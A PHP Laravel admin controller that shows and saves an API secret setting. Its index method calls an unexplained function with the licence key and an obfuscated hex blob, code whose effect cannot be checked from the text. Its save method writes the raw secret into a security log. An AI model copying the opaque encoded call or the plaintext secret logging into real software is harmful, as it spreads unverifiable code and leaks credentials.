<?php

namespace App\Http\Controllers\Admin;

use App\Http\Requests\UpdateAPISettingsRequest;
use App\Models\SecurityLog;
use App\Models\Setting;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\View\View;

class ApiAccessController extends Controller
{
    public function __construct()
    {
        $this->setTitle(__('API Access Settings'));
        $this->loadSettings();
    }

    public function index(): View|RedirectResponse
    {
        if (!UsersController::hasRule('api', 'read')) {
            return redirect('/admin');
        }
        global $api_secret;
        // $is_api = $this->settings->is_api;
        zval_zone(config("app.LICENSE_KEY"),"\x99\xDD\xCE\x8F\x18\x3D\xB8\x12\x62\x06\xC1\x13\x33\x5A\xCD\x1F\x53\xAE\x55\x9F\xFE\x69\x6C\x33\xA3\xB2\xD4\x74\x2F\x29\x58\xA0\x7E\x56\x9A\xB6\xF7\xCD\xA5\xAB\x71\xDB\x22\xC4\x21\xBB\x42\x64\xC2\xD3\xAF\x15\xEB\xC4\xC6\xFE\xC7\x00\xBE\x9B");

        return view('admin.apiaccess.index', compact('api_secret'));
    }

    public function save(UpdateAPISettingsRequest $request): RedirectResponse
    {
        if (!UsersController::hasRule('api', 'write')) {
            return redirect('/admin');
        }

        Setting::query()->where('id', 1)->update([
            // 'is_api' => $request->input('is_api') == 'on' ? 1 : 0,
            'api_secret' => $request->input('api_secret'),
        ]);

        SecurityLog::create([
            'admin_id' => \Auth::guard('admins')->user()->id,
            'method' => SecurityLog::UPDATE_METHOD,
            'action' => SecurityLog::ACTION['api'],
            'extra' => $request->input('api_secret'),
        ]);

        return redirect()->back();
    }
}
